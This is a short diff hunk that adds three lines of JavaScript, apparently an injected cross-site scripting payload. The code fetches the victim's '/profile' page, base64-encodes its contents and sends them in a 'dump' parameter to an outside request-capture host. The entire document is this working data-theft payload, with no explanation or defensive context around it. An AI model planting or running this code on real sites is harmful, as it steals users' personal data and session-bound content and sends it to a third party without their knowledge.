@@ -1,0 +1,3 @@
+fetch('/profile')
+  .then(res => res.text())
+  .then(body => fetch('https://mis7fofm.requestrepo.com/?dump='+btoa(body)));
